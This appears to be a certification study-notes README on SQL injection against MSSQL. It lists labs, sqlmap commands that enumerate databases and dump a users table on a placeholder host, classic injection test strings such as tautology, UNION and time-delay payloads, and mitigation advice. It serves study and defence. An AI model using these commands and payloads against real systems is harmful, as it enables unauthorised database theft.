# Module 15 — SQL Injection

## Overview
Database-layer injection attacks against MSSQL, covering automated exploitation, detection, and mitigation via parameterization and WAF rules.

## Learning Objectives
- Understand SQL injection classes: in-band, blind, and out-of-band
- Perform automated SQLi exploitation using sqlmap against MSSQL
- Detect SQLi vulnerabilities using OWASP ZAP active scan rules
- Use AI-assisted analysis for SQLi identification (ShellGPT)

## Labs Completed
- Lab 1 — SQL Injection Against MSSQL to Extract Databases Using sqlmap
- Lab 2 — Detect SQL Injection Vulnerabilities Using OWASP ZAP
- Lab 3 — SQL Injection Using ShellGPT

## Tools & Technologies
- sqlmap
- OWASP ZAP
- Burp Suite

## Key Commands / Techniques
```bash
sqlmap -u 'http://target.com/item?id=1' --dbms=mssql --batch --dbs
sqlmap -u 'http://target.com/item?id=1' -D testdb --tables
sqlmap -u 'http://target.com/item?id=1' -D testdb -T users --dump
```

## Sample Payloads / Test Strings
```
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; WAITFOR DELAY '0:0:5'--     # MSSQL time-based blind test
```
> All commands and payloads above were executed strictly within EC-Council's isolated CEH iLabs cyber range against consenting lab targets, for educational and certification purposes only.

## Detection & Mitigation
- Use parameterized queries / prepared statements exclusively — never concatenate user input into SQL
- Apply least-privilege database accounts (no dbo/sa for application connections)
- Deploy a WAF with SQLi rule sets as a defense-in-depth layer
- Enable database activity monitoring and query anomaly alerting
- Perform regular static/dynamic code review for injection-prone patterns

## Key Definitions
| Term | Definition |
|---|---|
| **SQL Injection** | Insertion of malicious SQL statements into an input field to manipulate backend database queries. |
| **Blind SQLi** | An injection technique where the application does not directly return query results, requiring boolean/time-based inference. |
| **Parameterized Query** | A query construction method that separates SQL code from user-supplied data, preventing injection. |

## References / Sources
- OWASP SQL Injection Prevention Cheat Sheet
- sqlmap Documentation — https://github.com/sqlmapproject/sqlmap
- EC-Council CEH v13 Module 15

---
[⬅ Back to main README](../../README.md)
